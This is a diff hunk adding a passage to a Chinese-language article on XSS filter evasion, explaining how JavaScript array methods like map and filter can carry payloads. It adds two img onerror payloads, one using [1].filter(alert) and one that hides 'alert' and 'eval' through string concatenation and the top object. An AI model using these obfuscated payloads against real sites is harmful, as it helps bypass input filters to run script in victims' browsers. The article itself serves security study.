@@ -21,4 +21,21 @@ map函数可以返回一个数组，`[1].map`，而且我们在使用`map`函数
 
 类似的数组操作函数不在少数，我所知的就有**find**，**every**，**filter**，**forEach**，**findIndex**。它们和**map**函数都有一个共同的特点，可以返回数组，而且在使用的同时还以可以传入一个函数，这就为我们构造payload提供更多的选择。
 
-我们思考一下，在那些情况下我们可以使用，其实满多，可以先看个demo
+我们思考一下，在那些情况下我们可以使用，其实满多，可以先看个demo。
+
+```php
+<img src=1 onerror=[1].filter(alert)>
+```
+成功弹窗
+
+![3](https://ws1.sinaimg.cn/large/005DAKuvgy1g203d50hfzj30ql094aal.jpg)
+
+那么如何更进一步呢，我们先思考下面这个例子。
+
+```php
+<img src=1 onerror=['ale'%2b'rt'].map(top['ev'%2b'al'])[0]['valu'%2b'eOf']()(/xss/)>
+```
+将`alert`函数以数组的方式拼接保存，通过嵌套`top`对象拆分带入`eval`函数，`valueOf`方法将返回值`/xss/`，成功弹窗。
+
+![4](https://ws1.sinaimg.cn/large/005DAKuvgy1g204i32laqj30qb09mgm7.jpg)
+
